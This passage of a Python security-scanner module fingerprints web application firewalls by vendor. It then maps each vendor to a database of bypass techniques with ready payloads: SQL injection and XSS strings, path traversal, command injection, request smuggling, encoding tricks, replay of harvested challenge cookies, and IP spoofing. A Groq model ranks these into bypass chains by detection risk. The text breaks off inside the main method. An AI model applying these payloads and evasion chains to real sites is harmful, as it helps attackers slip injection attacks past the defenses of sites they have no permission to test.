# AI_waf_fingerprinter.py
#
# Two-pass design:
#   Pass 1 — Active probing (deterministic):
#       1. Passive header fingerprint (Server, X-Powered-By, CF-Ray, X-Sucuri-ID, etc.)
#       2. Known WAF response fingerprinting (block page body patterns)
#       3. Probe with known WAF-trigger payloads per vendor signature
#       4. Timing analysis (rate-limit detection)
#       5. Cookie fingerprinting (WAF session cookies)
#       6. Version derivation from error page characteristics
#   Pass 2 — Groq AI:
#       Receives full fingerprint evidence > generates vendor-specific bypass chain,
#       evasion techniques, detection probability per technique, ordered by effectiveness

import hashlib
import json
import logging
import os
import random
import re
import time
from collections import defaultdict
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Any

import requests as req_lib

from core.http_client import HTTPClient

GROQ_API_KEY = os.getenv("GROQ_API_KEY", "")

# ---------------------------------------------------------------------------
# WAF Fingerprint Database
# Each entry:
#   headers:          {header_name: [pattern_strings]} — header value patterns
#   cookies:          [cookie_name_patterns] — session cookie names
#   block_body:       [body_string_patterns] — block page body content
#   block_status:     [http_status_codes] — typical block response codes
#   challenge_body:   [strings] — JS challenge page patterns
#   server_header:    [patterns] — Server: header values
#   x_header_keys:    [header_names] — unique headers injected by this WAF
#   version_patterns: {pattern: description} — version derivation from responses
#   confidence_weight: int — how many signals needed for high confidence
# ---------------------------------------------------------------------------

WAF_FINGERPRINTS: Dict[str, Dict] = {

    "Cloudflare": {
        "headers": {
            "CF-RAY":          [r"\w{16}-[A-Z]{3}"],
            "CF-Cache-Status": ["HIT", "MISS", "DYNAMIC", "EXPIRED"],
            "Server":          ["cloudflare"],
            "CF-Request-ID":   [r"\w+"],
            "CF-Connecting-IP": [r"\d+\.\d+\.\d+\.\d+"],
        },
        "cookies":        ["__cflb", "__cfduid", "cf_clearance", "__cf_bm", "_cfuvid"],
        "block_body":     [
            "Attention Required! | Cloudflare",
            "Sorry, you have been blocked",
            "cloudflare.com/5xx-error-landing",
            "Ray ID:",
            "What happened?",
            "cf-error-details",
            "cloudflare-static/media/cf-logo",
        ],
        "block_status":   [403, 429, 503],
        "challenge_body": [
            "__cf_chl_opt",
            "cf.challenge.js",
            "cf_chl_prog",
            "turnstile/v0/api.js",
            "challenges.cloudflare.com",
            "cf_clearance",
        ],
        "server_header":  ["cloudflare"],
        "x_header_keys":  ["CF-RAY", "CF-Cache-Status", "CF-Request-ID"],
        "version_patterns": {
                r"mitigated by Cloudflare Bot Management": "Cloudflare Bot Management",
                r"cf-chl-prog.*5":                        "Cloudflare Challenge v5+",
                r"turnstile":                             "Cloudflare Turnstile (2022+)",
                r"__cf_bm":                               "Cloudflare Bot Management (2020+)",
        },
        "confidence_weight": 2,
    },

    "Akamai": {
        "headers": {
            "X-Check-Cacheable":  ["YES", "NO"],
            "X-Akamai-Transformed": [r"\w+"],
            "X-Cache":            ["TCP_HIT", "TCP_MISS"],
            "X-True-Cache-Key":   [r".+"],
            "Akamai-Origin-Hop":  [r"\d+"],
            "X-Akamai-Request-ID": [r"\w+"],
        },
        "cookies":        ["ak_bmsc", "bm_sz", "bm_sv", "_abck", "akacd_"],
        "block_body":     [
            "Access Denied",
            "You don't have permission to access",
            "Reference&#32;#",
            "Provided by Akamai",
            "akamaierror",
            "akamai-siem",
            "Reference #",
        ],
        "block_status":   [403, 400],
        "challenge_body": [
            "_bm_wait",
            "sbsd_o",
            "bmak.js",
            "instart/instart.js",
        ],
        "server_header":  [],
        "x_header_keys":  ["X-Check-Cacheable", "Akamai-Origin-Hop", "X-Akamai-Request-ID"],
        "version_patterns": {
            r"bot manager":     "Akamai Bot Manager",
            r"_abck":           "Akamai Bot Manager 2020+",
            r"ak_bmsc":         "Akamai Bot Manager (sensor data cookie)",
        },
        "confidence_weight": 2,
    },

    "Imperva": {
        "headers": {
            "X-Iinfo":            [r"\d+-\d+-\d+-\d+"],
            "X-CDN":              ["Incapsula"],
            "Incap-Session-Id":   [r"\w+"],
        },
        "cookies":        ["visid_incap_", "incap_ses_", "nlbi_", "reese84"],
        "block_body":     [
            "Incapsula incident ID",
            "_Incapsula_Resource",
            "request unsuccessful",
            "/_Incapsula_Resource",
            "incapsula.com",
            "visid_incap",
            "/_Incapsula_Resource?SWCGHOEL",
        ],
        "block_status":   [403],
        "challenge_body": [
            "reese84",
            "/_Incapsula_Resource",
            "incapsula_resource",
        ],
        "server_header":  [],
        "x_header_keys":  ["X-Iinfo", "X-CDN"],
        "version_patterns": {
            r"reese84":          "Imperva Advanced Bot Protection",
            r"nlbi_":            "Imperva Load Balancer cookie",
            r"incapsula":        "Imperva/Incapsula classic",
        },
        "confidence_weight": 2,
    },

    "AWS WAF": {
        "headers": {
            "X-AMZ-CF-ID":        [r"\w{20,}"],
            "X-AMZ-REQUEST-ID":   [r"\w+"],
            "x-amzn-requestid":   [r"\w+-\w+-\w+-\w+-\w+"],
            "x-amz-apigw-id":     [r"\w+="],
        },
        "cookies":        ["AWSALB", "AWSALBCORS", "AWSWAF"],
        "block_body":     [
            "403 Forbidden",
            "Request blocked",
            "AWS WAF",
            "<Code>AccessDenied</Code>",
        ],
        "block_status":   [403],
        "challenge_body": [
            "aws-waf-token",
            "AwsWafIntegration",
        ],
        "server_header":  [],
        "x_header_keys":  ["X-AMZ-CF-ID", "x-amzn-requestid"],
        "version_patterns": {
            r"aws-waf-token":     "AWS WAF with CAPTCHA integration",
            r"AwsWafIntegration": "AWS WAF JavaScript challenge",
        },
        "confidence_weight": 2,
    },

    "F5 BIG-IP ASM": {
        "headers": {
            "X-Cnection":        ["close"],
            "Server":            [r"BigIP", r"BIG-IP"],
            "X-WA-Info":         [r"\w+"],
        },
        "cookies":        ["BIGipServer", "TS", "F5_ST", "F5_HT_shpis"],
        "block_body":     [
            "The requested URL was rejected",
            "Please consult with your administrator",
            "Your support ID is",
            "bigip",
        ],
        "block_status":   [403, 500],
        "challenge_body": [],
        "server_header":  ["BigIP", "BIG-IP"],
        "x_header_keys":  ["X-WA-Info", "X-Cnection"],
        "version_patterns": {
            r"TS\w{8}":          "F5 BIG-IP (TS cookie — version fingerprint possible)",
            r"support ID":       "F5 ASM block page (support ID present)",
        },
        "confidence_weight": 2,
    },

    "Fortinet FortiWeb": {
        "headers": {
            "FORTIWAFSID":       [r"\w+"],
            "X-Powered-By-Fortiwaf": [r"\w+"],
        },
        "cookies":        ["FORTIWAFSID", "cookiesession1"],
        "block_body":     [
            "FortiWeb",
            "web application firewall has blocked your request",
            "FortiGate",
        ],
        "block_status":   [403],
        "challenge_body": [],
        "server_header":  [],
        "x_header_keys":  ["FORTIWAFSID"],
        "version_patterns": {},
        "confidence_weight": 1,
    },

    "Barracuda": {
        "headers": {},
        "cookies":        ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE", "BNI_persistence"],
        "block_body":     [
            "Barracuda Networks",
            "bwaf/assets/",
            "You have been blocked",
            "barracuda",
        ],
        "block_status":   [403],
        "challenge_body": [],
        "server_header":  [],
        "x_header_keys":  [],
        "version_patterns": {},
        "confidence_weight": 1,
    },

    "ModSecurity": {
        "headers": {
            "Server": [r"Mod_Security", r"ModSecurity", r"NOYB"],
        },
        "cookies":        [],
        "block_body":     [
            "This error was generated by Mod_Security",
            "Not Acceptable",
            "406 Not Acceptable",
            "You don't have permission",
            "Mod_Security",
            "ModSecurity",
        ],
        "block_status":   [403, 406, 501],
        "challenge_body": [],
        "server_header":  ["Mod_Security", "ModSecurity"],
        "x_header_keys":  [],
        "version_patterns": {
            r"OWASP CRS":        "ModSecurity + OWASP CRS",
            r"/2\.\d+\.\d+":    "ModSecurity 2.x",
            r"/3\.\d+\.\d+":    "ModSecurity 3.x (connector-based)",
        },
        "confidence_weight": 1,
    },

    "Sucuri": {
        "headers": {
            "X-Sucuri-ID":       [r"\d+"],
            "X-Sucuri-Cache":    ["HIT", "MISS"],
            "Server":            ["Sucuri/Cloudproxy"],
        },
        "cookies":        ["sucuri_cloudproxy_uuid_"],
        "block_body":     [
            "Sucuri WebSite Firewall",
            "sucuri.net",
            "Access Denied - Sucuri",
            "cloudproxy.sucuri.net",
        ],
        "block_status":   [403],
        "challenge_body": ["sucuri_cloudproxy"],
        "server_header":  ["Sucuri/Cloudproxy", "Sucuri"],
        "x_header_keys":  ["X-Sucuri-ID", "X-Sucuri-Cache"],
        "version_patterns": {},
        "confidence_weight": 2,
    },

    "Wordfence": {
        "headers": {},
        "cookies":        ["wfvt_", "wordfence_verifiedHuman"],
        "block_body":     [
            "Generated by Wordfence",
            "Wordfence",
            "wordfence.com",
            "Your access to this site has been limited",
            "wordfence_livetraffic",
        ],
        "block_status":   [403],
        "challenge_body": ["wordfence_verifiedHuman"],
        "server_header":  [],
        "x_header_keys":  [],
        "version_patterns": {},
        "confidence_weight": 1,
    },

    "Varnish + Custom WAF": {
        "headers": {
            "X-Varnish":         [r"\d+"],
            "Via":               [r"varnish"],
            "X-Cache":           ["HIT", "MISS", "PASS"],
            "X-Cache-Hits":      [r"\d+"],
        },
        "cookies":        [],
        "block_body":     [
            "Error 403 Forbidden",
            "varnishd",
        ],
        "block_status":   [403],
        "challenge_body": [],
        "server_header":  ["varnish"],
        "x_header_keys":  ["X-Varnish"],
        "version_patterns": {
            r"X-Varnish: \d+ \d+": "Varnish with hit/miss ID pair",
        },
        "confidence_weight": 1,
    },
}

# ---------------------------------------------------------------------------
# WAF-trigger probe payloads — designed to trigger block pages, not exploit
# Each probe: (label, payload, injection_location)
# injection_location: query | body | header | path | cookie
# ---------------------------------------------------------------------------

WAF_PROBE_PAYLOADS: List[Tuple[str, str, str]] = [
    # SQLi class — triggers most WAF SQLi rules
    ("sqli_basic",          "' OR '1'='1",                       "query"),
    ("sqli_comment",        "1' AND 1=1-- -",                    "query"),
    ("sqli_union",          "' UNION SELECT NULL--",             "query"),
    ("sqli_error",          "' AND extractvalue(1,version())--", "query"),
    # XSS class
    ("xss_basic",           "<script>alert(1)</script>",         "query"),
    ("xss_svg",             "<svg onload=alert(1)>",             "query"),
    ("xss_img",             "<img src=x onerror=alert(1)>",      "query"),
    # Path traversal
    ("path_traversal",      "../../../../etc/passwd",            "query"),
    ("path_traversal_enc",  "%2e%2e%2f%2e%2e%2fetc%2fpasswd",   "query"),
    # Command injection
    ("cmdi_semicolon",      "; id",                              "query"),
    ("cmdi_pipe",           "| id",                              "query"),
    # Scanner UA — many WAFs block known scanner user agents
    ("scanner_ua_sqlmap",   "",                  "header"),   # via UA header
    ("scanner_ua_nikto",    "",                  "header"),
    # Null byte
    ("null_byte",           "%00",                               "query"),
    # SSTI detection
    ("ssti_jinja",          "{{7*7}}",                           "query"),
    ("ssti_dollar",         "${7*7}",                            "query"),
]

SCANNER_UAS = {
    "scanner_ua_sqlmap": "sqlmap/1.7 (https://sqlmap.org)",
    "scanner_ua_nikto":  "Nikto/2.1.6 (Evasion=None)",
}

# Rate limit probe — if 5 requests in 1 second triggers a block, WAF rate-limiting confirmed
RATE_PROBE_COUNT   = 8
RATE_PROBE_WINDOW  = 1.0   # seconds

# ---------------------------------------------------------------------------
# Confidence levels
# ---------------------------------------------------------------------------
CONFIDENCE_HIGH   = "high"
CONFIDENCE_MEDIUM = "medium"
CONFIDENCE_LOW    = "low"

CONFIDENCE_SCORE = {
    CONFIDENCE_HIGH:   90,
    CONFIDENCE_MEDIUM: 60,
    CONFIDENCE_LOW:    30,
}

# ---------------------------------------------------------------------------
# Bypass technique database — keyed by vendor, ordered by effectiveness
# Each entry:
#   name:         technique name
#   description:  what it does
#   applies_to:   [vuln_classes]
#   payloads:     [example_payload]
#   limitations:  str
#   detection_risk: low | medium | high
# ---------------------------------------------------------------------------

BYPASS_TECHNIQUES: Dict[str, List[Dict]] = {

    "Cloudflare": [
        {
            "name":           "HTTP/2 Desync + Chunked TE",
            "description":    "Cloudflare processes HTTP/1.1 and passes HTTP/2 to origin. Chunked Transfer-Encoding smuggling can deliver a request that CF never inspects.",
            "applies_to":     ["sqli", "xss", "ssrf", "cmdi"],
            "payloads":       [
                "Transfer-Encoding: chunked with injected prefix",
                "POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n...0\\r\\n\\r\\nINJECTION",
            ],
            "limitations":    "Requires HTTP/1.1 to backend. CF has partially patched CL.TE but TE.CL remains viable on some configs.",
            "detection_risk": "low",
        },
        {
            "name":           "Unicode Normalisation Bypass",
            "description":    "Cloudflare WAF normalises Unicode before matching. Certain Unicode variants bypass the regex engine.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "①②③ → 123 (Unicode digits)",
                "ｓｅｌｅｃｔ (fullwidth chars)",
                "ＵＮＩＯＮ ＳＥＬＥＣＴＵＮＩＯＮfull-width",
                "\\u0027 OR \\u00271\\u0027=\\u00271",
            ],
            "limitations":    "Only works for rules relying on ASCII matching. Payload depends on target's charset handling.",
            "detection_risk": "low",
        },
        {
            "name":           "Cloudflare Turnstile CF-Clearance Token Reuse",
            "description":    "A valid cf_clearance cookie from one request can be reused in automated requests within the same session window.",
            "applies_to":     ["all"],
            "payloads":       ["Obtain cf_clearance via headless browser, attach to subsequent automated requests."],
            "limitations":    "Cookie tied to IP and UA. Must match original session fingerprint exactly.",
            "detection_risk": "medium",
        },
        {
            "name":           "URL Parameter Pollution",
            "description":    "Cloudflare WAF evaluates the first occurrence of a parameter. Sending the malicious value in a second occurrence may bypass inspection.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "?id=1&id=' OR '1'='1",
                "GET /path?a=safe&a=PAYLOAD",
            ],
            "limitations":    "Depends on how origin app resolves duplicate parameters.",
            "detection_risk": "low",
        },
        {
            "name":           "JSON Body Encapsulation",
            "description":    "Wrapping SQL or XSS payloads inside a JSON body can evade CF WAF rules tuned for form-urlencoded.",
            "applies_to":     ["sqli", "xss", "nosql"],
            "payloads":       [
                '{"id": "1\\' OR \\'1\\'=\\'1"}',
                '{"q": "<script>alert(1)</script>"}',
            ],
            "limitations":    "Only works if origin accepts JSON for the endpoint.",
            "detection_risk": "low",
        },
        {
            "name":           "Newline / CRLF Injection in Request",
            "description":    "Injecting CRLF sequences in header values or URL can bypass log inspection and some WAF header rules.",
            "applies_to":     ["xss", "header_injection"],
            "payloads":       [
                "%0d%0aX-Injected: evil",
                "%0a%0dSet-Cookie: session=evil",
            ],
            "limitations":    "Modern Cloudflare versions strip CRLF. Effective against older configs or proxies in front of CF.",
            "detection_risk": "medium",
        },
    ],

    "Akamai": [
        {
            "name":           "Multipart Boundary Injection",
            "description":    "Akamai WAF has weaker inspection of multipart/form-data bodies. Payloads in part filenames or non-standard MIME parts may bypass rules.",
            "applies_to":     ["sqli", "xss", "cmdi"],
            "payloads":       [
                "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"' OR 1=1--.txt\"\r\nContent-Type: text/plain\r\n\r\ndata",
            ],
            "limitations":    "Depends on application accepting file uploads. Part headers may still be inspected.",
            "detection_risk": "low",
        },
        {
            "name":           "HTTP Pipeline Smuggling",
            "description":    "Akamai's edge may pipeline requests differently than the origin. Pipelining a poisoned second request can bypass per-request WAF inspection.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       ["Send two pipelined requests — first clean, second malicious in same TCP stream."],
            "limitations":    "Requires HTTP/1.1 keepalive. Akamai patches pipeline attacks frequently.",
            "detection_risk": "low",
        },
        {
            "name":           "Comment Obfuscation (SQL)",
            "description":    "SQL comment insertion between keywords breaks Akamai's keyword-based detection.",
            "applies_to":     ["sqli"],
            "payloads":       [
                "1' UN/**/ION SEL/**/ECT NULL,NULL--",
                "1'/*!50000UNION*//*!50000SELECT*/NULL,NULL--",
                "1'/*! UNION *//*! SELECT */ NULL--",
            ],
            "limitations":    "Database must support nested comments (MySQL). Akamai CRS rules may still catch /*!",
            "detection_risk": "low",
        },
        {
            "name":           "Charset Confusion",
            "description":    "Sending a request with an unexpected charset (UTF-16, IBM037) can confuse Akamai's body decoder while the origin handles it correctly.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "Content-Type: application/x-www-form-urlencoded; charset=IBM037",
                "Content-Type: text/html; charset=UTF-7",
            ],
            "limitations":    "Origin must accept the alternate charset. Rare in modern apps.",
            "detection_risk": "low",
        },
        {
            "name":           "Sensor Data Bypass (_abck Cookie)",
            "description":    "Akamai Bot Manager relies on the _abck sensor data cookie. Solving the challenge programmatically via browser automation yields a valid cookie.",
            "applies_to":     ["all"],
            "payloads":       ["Use Playwright/Puppeteer to harvest _abck + bm_sz cookies, replay in automated requests."],
            "limitations":    "Akamai updates challenge JavaScript frequently. Valid for ~hours before cookie expires.",
            "detection_risk": "medium",
        },
    ],

    "Imperva": [
        {
            "name":           "reese84 Cookie Bypass",
            "description":    "Imperva Advanced Bot Protection relies on the reese84 cookie. This cookie can be obtained via headless browser session and reused.",
            "applies_to":     ["all"],
            "payloads":       ["Solve reese84 challenge with Puppeteer, harvest cookie, attach to automation."],
            "limitations":    "Cookie tied to browser fingerprint including canvas, fonts, timing. Fingerprint must match.",
            "detection_risk": "medium",
        },
        {
            "name":           "Incapsula Resource Request Spoof",
            "description":    "Requesting /_Incapsula_Resource with a spoofed referrer can sometimes return a session cookie that bypasses challenge.",
            "applies_to":     ["all"],
            "payloads":       [
                "GET /_Incapsula_Resource?SWCGHOEL=1 HTTP/1.1",
                "Referer: https://target.com/",
            ],
            "limitations":    "Patched on most modern Imperva configs. Worth testing on older deployments.",
            "detection_risk": "low",
        },
        {
            "name":           "Double URL Encoding",
            "description":    "Imperva decodes single-encoded payloads but may pass double-encoded input to the origin which then decodes it.",
            "applies_to":     ["sqli", "xss", "path_traversal"],
            "payloads":       [
                "%2527 → %27 → '",
                "%253c%2573%2563%2572%2569%2570%2574%253e → <script>",
                "%252e%252e%252f%252e%252e%252f → ../../",
            ],
            "limitations":    "Only works if origin double-decodes. Modern apps rarely do — but legacy PHP/ASP.NET may.",
            "detection_risk": "low",
        },
        {
            "name":           "HTTP Header Case Variation",
            "description":    "Imperva WAF may case-sensitively match certain header names. Altering case of custom headers can smuggle past inspection.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "X-Forwarded-For → x-forwarded-for → X-FORWARDED-FOR",
                "cOnTent-TyPe: application/json",
            ],
            "limitations":    "Modern Imperva versions normalise headers. More effective against on-prem deployments.",
            "detection_risk": "low",
        },
    ],

    "AWS WAF": [
        {
            "name":           "Newline Injection in Query String",
            "description":    "AWS WAF's regex rules may not account for URL-encoded newlines (%0a) inside parameter values, allowing payload splitting.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "?id=1%0a%27%20OR%20%271%27%3d%271",
                "?q=<script%0a>alert(1)</script%0a>",
            ],
            "limitations":    "URL decoding rules vary by AWS WAF rule group version. OWASP ruleset v3+ patches most of these.",
            "detection_risk": "low",
        },
        {
            "name":           "Parameter Pollution via POST + GET",
            "description":    "AWS WAF inspects POST body and query string separately. A payload split across both may not trigger any single rule.",
            "applies_to":     ["sqli"],
            "payloads":       [
                "GET /api?id=1 UNION SELECT — POST body: NULL,NULL,version()--",
            ],
            "limitations":    "Only works if the application concatenates both sources. Unusual but present in legacy apps.",
            "detection_risk": "low",
        },
        {
            "name":           "aws-waf-token CAPTCHA Bypass",
            "description":    "AWS WAF CAPTCHA integration can be bypassed by solving the CAPTCHA via headless browser and reusing the token.",
            "applies_to":     ["all"],
            "payloads":       ["Solve AWS WAF CAPTCHA with Playwright, harvest aws-waf-token, replay in automation."],
            "limitations":    "Token has a TTL. Rate of solving limited by CAPTCHA difficulty.",
            "detection_risk": "medium",
        },
        {
            "name":           "Managed Rule Group Gap — SQLi in JSON",
            "description":    "AWS WAF AWSManagedRulesSQLiRuleSet has known gaps for SQLi within JSON body values. JSON-encoded payloads in nested objects may not be inspected.",
            "applies_to":     ["sqli", "nosql"],
            "payloads":       [
                '{"query":{"user":{"id":"1\' OR 1=1--"}}}',
                '{"filter":{"$where":"this.id==1 OR 1==1"}}',
            ],
            "limitations":    "AWS updates managed rule groups. Check current rule group version for known gaps.",
            "detection_risk": "low",
        },
    ],

    "F5 BIG-IP ASM": [
        {
            "name":           "HTTP/2 Multiplexing — Frame Injection",
            "description":    "F5 ASM's HTTP/2 parser has had vulnerabilities where HEADERS frames with injected payloads bypass inspection. CVE-2022-26377 related.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       ["Send malicious payload in HTTP/2 HEADERS frame with unusual pseudo-header ordering."],
            "limitations":    "Requires HTTP/2 to be enabled on BIG-IP. Patched in BIG-IP >= 15.1.5.1.",
            "detection_risk": "low",
        },
        {
            "name":           "BIG-IP TS Cookie Version Fingerprint Attack",
            "description":    "The TS (persistence) cookie encodes the pool member. Decoded, it reveals internal IP:port. Used for SSRF to internal services.",
            "applies_to":     ["ssrf"],
            "payloads":       [
                "Decode TS cookie: base64 decode → XOR with 0x97 → reveals internal IP",
                "Use decoded IP in SSRF payload targeting internal BIG-IP management (8443)",
            ],
            "limitations":    "Only reveals internal addressing. SSRF must be present for exploitation.",
            "detection_risk": "medium",
        },
        {
            "name":           "Wildcard Character in SQL — F5 Specific Gap",
            "description":    "F5 ASM pattern matching uses PCRE. Specific combinations of wildcard and length operators can exceed backtrack limits, causing catastrophic backtracking and bypass.",
            "applies_to":     ["sqli"],
            "payloads":       [
                "1' AND (SELECT 0x" + "41" * 1000 + ")--",
                "'/*" + "A" * 2000 + "*/OR 1=1--",
            ],
            "limitations":    "Causes ASM CPU spike — detectable. Only works against ASM with signature-based mode.",
            "detection_risk": "high",
        },
    ],

    "ModSecurity": [
        {
            "name":           "OWASP CRS Rule Scoring Gap — Multi-Vector",
            "description":    "ModSecurity with OWASP CRS uses an anomaly scoring model. If no single payload exceeds the threshold, the request passes. Distributing a payload across multiple parameters can stay below the alert threshold.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "param1=1'&param2=UNION&param3=SELECT&param4=NULL--",
                "Split UNION SELECT across two parameters; each alone scores < 5 but combined = injection",
            ],
            "limitations":    "CRS paranoia level ≥ 3 catches many split attempts. Default (level 1) is more permissive.",
            "detection_risk": "low",
        },
        {
            "name":           "Keyword Fragmentation via HTTP Parameter Pollution",
            "description":    "PHP and ASP.NET join duplicate parameters with commas. UNION,SELECT is not a SQL keyword — splits the payload below CRS score threshold.",
            "applies_to":     ["sqli"],
            "payloads":       [
                "?q=UN&q=ION&q=+SEL&q=ECT+NULL--",
                "POST: a=UN&a=ION+SE&a=LECT+NULL--",
            ],
            "limitations":    "PHP join behaviour: ?q[]=UN&q[]=ION → array, not string. Depends on application query construction.",
            "detection_risk": "low",
        },
        {
            "name":           "Base64 Encoding in Accepted Context",
            "description":    "ModSecurity does not inspect base64-decoded content by default unless specifically configured. If the application base64-decodes before processing, the WAF will not inspect the decoded payload.",
            "applies_to":     ["sqli", "xss", "ssti"],
            "payloads":       [
                "X-Custom-Header: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  (base64 of <script>alert(1)</script>)",
            ],
            "limitations":    "Application must base64-decode the input. Rare in standard form parameters.",
            "detection_risk": "low",
        },
        {
            "name":           "Version-Specific Rule Bypass (CRS < 3.3.4)",
            "description":    "OWASP CRS versions before 3.3.4 have known bypasses for rule 942100 (SQL Injection). Specific payload constructs evade the regex.",
            "applies_to":     ["sqli"],
            "payloads":       [
                "1 AND 1=1 ORDER BY 1--",
                "1/* comment */AND 1=1--",
            ],
            "limitations":    "Only effective against CRS < 3.3.4. Check ModSecurity version from error pages.",
            "detection_risk": "low",
        },
    ],

    "Sucuri": [
        {
            "name":           "Case Variation",
            "description":    "Sucuri WAF relies on case-sensitive pattern matching for many rules.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "' uNiOn SeLeCt NULL,NULL--",
                "<ScRiPt>alert(1)</sCrIpT>",
            ],
            "limitations":    "Sucuri updates rules regularly. Case variation alone rarely sufficient on modern configs.",
            "detection_risk": "low",
        },
        {
            "name":           "URL Encoding Layers",
            "description":    "Sucuri decodes URL-encoded characters once. Double-encoded payloads pass WAF inspection and are decoded by the origin.",
            "applies_to":     ["sqli", "xss", "path_traversal"],
            "payloads":       [
                "%2527 → %27 → '",
                "%253cscript%253ealert(1)%253c%252fscript%253e",
            ],
            "limitations":    "Modern Sucuri versions perform recursive decoding. Test empirically.",
            "detection_risk": "low",
        },
        {
            "name":           "Whitespace Variants",
            "description":    "Sucuri WAF uses regex with standard whitespace. Alternative whitespace characters (%09, %0b, %0c, %a0) can break keyword detection.",
            "applies_to":     ["sqli"],
            "payloads":       [
                "1'%09AND%091=1--",
                "UNION%0bSELECT%0bNULL--",
                "1'%0cOR%0c1=1--",
            ],
            "limitations":    "Database must accept the alternative whitespace in SQL. MySQL and PostgreSQL do, MSSQL varies.",
            "detection_risk": "low",
        },
    ],

    "Wordfence": [
        {
            "name":           "REST API Namespace Bypass",
            "description":    "Wordfence scans are configurable per URL path. The WordPress REST API (/wp-json/) and XML-RPC (/xmlrpc.php) may have different or weaker rule sets.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "POST /wp-json/wp/v2/posts with SQLi in meta fields",
                "POST /xmlrpc.php with XML-encoded payload",
            ],
            "limitations":    "Wordfence Premium covers REST API. Free tier may leave REST endpoints less protected.",
            "detection_risk": "low",
        },
        {
            "name":           "Wordfence Rate Limit Bypass via IP Rotation",
            "description":    "Wordfence rate limiting is IP-based. Using X-Forwarded-For header spoofing or IP rotation bypasses the per-IP counter.",
            "applies_to":     ["brute_force"],
            "payloads":       [
                "X-Forwarded-For: ROTATED_IP",
                "True-Client-IP: ROTATED_IP",
            ],
            "limitations":    "Only works if Wordfence trusts X-Forwarded-For (depends on server config). Most modern installs do not.",
            "detection_risk": "low",
        },
    ],

    "generic": [
        {
            "name":           "HTTP/2 to HTTP/1.1 Desync",
            "description":    "Front-end accepts HTTP/2, back-end speaks HTTP/1.1. CL.TE or TE.CL desync allows a request prefix to be injected into the next victim's request.",
            "applies_to":     ["sqli", "xss", "auth_bypass"],
            "payloads":       [
                "smuggler.py -u https://target.com/ -t cl.te",
                "Burp Suite HTTP Request Smuggler extension",
            ],
            "limitations":    "Requires specific front-end / back-end version mismatch. Patchable at proxy level.",
            "detection_risk": "low",
        },
        {
            "name":           "Content-Type Confusion",
            "description":    "WAF inspects body based on Content-Type. Mismatch between declared and actual content type can cause the WAF to skip inspection.",
            "applies_to":     ["sqli", "xss", "xxe"],
            "payloads":       [
                "Declare: Content-Type: image/gif  →  Send: SQL payload in body",
                "Declare: Content-Type: text/plain  →  Send: XML with XXE",
            ],
            "limitations":    "Modern WAFs perform content sniffing. Effective against signature-only WAFs.",
            "detection_risk": "low",
        },
        {
            "name":           "Boundary Mutation in Multipart",
            "description":    "MIME multipart boundary mutations (extra dashes, embedded whitespace) confuse WAF parsers while most web servers still process them.",
            "applies_to":     ["sqli", "xss"],
            "payloads":       [
                "--boundary--  →  --boundary  --  (extra space)",
                "--boundary\\r\\n  →  --boundary \\r\\n  (trailing space before CRLF)",
            ],
            "limitations":    "RFC non-compliant. Some web servers reject malformed boundaries.",
            "detection_risk": "low",
        },
    ],
}


# ---------------------------------------------------------------------------
# Main fingerprinter
# ---------------------------------------------------------------------------

class AIWAFFingerprinter:
    """
    Deep WAF fingerprinting engine for ARTEX.

    Pass 1 — Active probing (deterministic, no AI):
        1. Collect response headers/cookies from normal requests
        2. Match against WAF_FINGERPRINTS header/cookie signatures
        3. Probe with WAF-trigger payloads, analyse response delta
        4. Rate-limit detection (burst probe)
        5. Challenge page identification
        6. Version derivation from error page patterns
        7. Build confidence score per WAF vendor

    Pass 2 — Groq AI:
        Receives full evidence → generates ordered bypass chain specific
        to the detected WAF vendor, tech stack, and vuln classes present.

    Slot in run_scan() after tech_detection + payload_analysis:
        waf_fp = AIWAFFingerprinter(groq_api_key=GROQ_API_KEY)
        scan_results[scan_id]['waf_fingerprint'] = waf_fp.fingerprint(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        groq_api_key: str = GROQ_API_KEY,
        timeout:      int = 10,
        probe_delay:  float = 0.5,
    ):
        self.groq_api_key = groq_api_key
        self.timeout      = timeout
        self.probe_delay  = probe_delay
        self._session     = req_lib.Session()
        self.logger       = logging.getLogger(__name__)

        if not self.logger.handlers:
            h = logging.StreamHandler()
            h.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] AIWAFFingerprinter — %(message)s"
            ))
            self.logger.addHandler(h)
            self.logger.setLevel(logging.INFO)

        self._ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        ]

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def fingerprint(
        self,
        domain:       str,
        scan_results: Dict,
    ) -> Dict:
        """
        Args:
            domain:       Primary target domain.
            scan_results: Full ARTEX scan_results dict.

        Returns dict:
            detected:        bool
            vendor:          str | None
            confidence:      str (high|medium|low)
            confidence_score: int 0-100
            version_clues:   [str]
            evidence:        {headers, cookies, block_body, challenge}
            probe_results:   [{probe_label, triggered, status, delta}]
            rate_limit_detected: bool
            bypass_chain:    [{name, description, payloads, ...}]
            ai_analysis:     Groq enrichment | None
            scan_metadata
        """
        self.logger.info(f"WAF fingerprinting — domain: {domain}")
        start = time.time()

        # ── Extract existing WAF hint from payload_analysis ───────────
        pa          = scan_results.get("payload_analysis") or {}
        waf_hint    = pa.get("waf_detected", {})
